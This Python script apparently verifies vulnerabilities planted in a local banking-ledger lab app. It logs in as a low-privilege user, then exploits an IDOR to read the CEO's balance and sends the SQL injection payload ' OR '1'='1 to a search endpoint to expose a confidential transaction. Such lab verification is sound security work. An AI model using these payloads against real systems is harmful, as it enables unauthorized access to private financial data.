import urllib.request
import json
import urllib.parse
import sys
import time

BASE_URL = "http://localhost:80"

# 1. Login to get token
def login(username, password):
    url = f"{BASE_URL}/auth/login"
    data = urllib.parse.urlencode({
        "username": username,
        "password": password
    }).encode('utf-8')
    req = urllib.request.Request(url, data=data, headers={'Content-Type': 'application/x-www-form-urlencoded'}, method='POST')
    try:
        with urllib.request.urlopen(req) as response:
            body = response.read().decode('utf-8')
            return json.loads(body)["access_token"]
    except Exception as e:
        print(f"[FAIL] Login failed: {e}")
        return None

# 2. Test IDOR
def test_idor(token):
    print("\nTesting IDOR (Accessing Account 1 - CEO)...")
    # Looking for Account ID 1 (CEO is seeded first usually, let's assume it gets ID 1)
    url = f"{BASE_URL}/ledger/balance/1" 
    req = urllib.request.Request(url, headers={'Authorization': f'Bearer {token}'}, method='GET')
    try:
        with urllib.request.urlopen(req) as response:
            body = response.read().decode('utf-8')
            print(f"Response: {body}")
            data = json.loads(body)
            if data["balance"] == 1000000.0:
                print("[PASS] IDOR Successful! Accessed CEO balance.")
            else:
                print(f"[FAIL] Balance mismatch or not CEO: {data}")
    except Exception as e:
        print(f"[FAIL] IDOR check failed: {e}")

# 3. Test SQL Injection
def test_sqli(token):
    print("\nTesting SQL Injection...")
    # SQLi Payload: ' OR '1'='1
    query = "' OR '1'='1"
    encoded_query = urllib.parse.quote(query)
    url = f"{BASE_URL}/ledger/transactions/search?q={encoded_query}"
    req = urllib.request.Request(url, headers={'Authorization': f'Bearer {token}'}, method='GET')
    try:
        with urllib.request.urlopen(req) as response:
            body = response.read().decode('utf-8')
            print(f"Response: {body}")
            data = json.loads(body)
            # If we get results including the CEO's 'Confidential Bonus Payment', it worked.
            found_secret = False
            for txn in data:
                if "Confidential Bonus Payment" in txn["description"]:
                    found_secret = True
                    break
            
            if found_secret:
                print("[PASS] SQLi Successful! Found confidential transaction.")
            else:
                print("[FAIL] SQLi executed but secret not found (or no results).")
    except Exception as e:
        print(f"[FAIL] SQLi check failed: {e}")

if __name__ == "__main__":
    # Register/Login a low level user
    # Note: re-using existing user from Phase 2 verify if persistent, or new one.
    # Let's try to register a new one to be safe.
    reg_url = f"{BASE_URL}/auth/register"
    reg_payload = {"username": "low_level_user", "password": "123", "is_admin": False}
    try:
        urllib.request.urlopen(urllib.request.Request(reg_url, data=json.dumps(reg_payload).encode('utf-8'), headers={'Content-Type': 'application/json'}, method='POST'))
    except:
        pass # Might already exist
    
    token = login("low_level_user", "123")
    if token:
        test_idor(token)
        test_sqli(token)
